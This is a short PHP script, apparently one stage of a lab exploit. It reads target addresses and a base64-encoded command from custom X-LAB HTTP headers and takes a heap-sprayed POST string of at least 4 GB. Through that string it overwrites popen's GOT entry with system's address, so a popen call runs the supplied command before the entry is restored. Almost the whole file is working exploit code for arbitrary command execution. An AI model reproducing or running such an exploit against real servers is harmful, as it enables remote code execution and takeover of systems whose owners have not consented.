<?php
header("Content-Type: text/plain");
$A   = hexdec($_SERVER['HTTP_X_LAB_A'] ?? '0');
$SYS = hexdec($_SERVER['HTTP_X_LAB_SYS'] ?? '0');
$GOT = hexdec($_SERVER['HTTP_X_LAB_GOT'] ?? '0');
$I   = (int)($_SERVER['HTTP_X_LAB_I'] ?? '0');
$CMD = base64_decode($_SERVER['HTTP_X_LAB_CMD'] ?? '');
$VAL = $A + 24;
$key = sprintf('spray%05d', $I);
$s = $_POST[$key] ?? '';
$len = strlen($s);
echo "strlen=$len len_ok=".($len>=0x100000000?1:0)."\n"; flush();
if ($len < 0x100000000) { echo "GEOMETRY_FAIL\n"; exit; }
$off = $GOT - $VAL;
echo "A=".dechex($A)." SYS=".dechex($SYS)." GOT=".dechex($GOT)." off=".dechex($off)."\n"; flush();
if ($off <= 0 || $off + 8 > $len) { echo "DIRECTION_FAIL module not forward\n"; exit; }
function w($o,$b){ global $s; $n=strlen($b); for($i=0;$i<$n;$i++){ $s[$o+$i]=$b[$i]; } }
$old = substr($s,$off,8);
w($off, pack("P",$SYS));            /* popen@got -> system */
echo "got_overwritten rb=".bin2hex(substr($s,$off,8))."\n"; flush();
@file_put_contents("/tmp/.exploit_pre", "1");
@popen($CMD, "r");                  /* -> system($CMD) */
w($off, $old);                      /* restore popen@got */
@file_put_contents("/tmp/.exploit_done", "1");
echo "done\n";
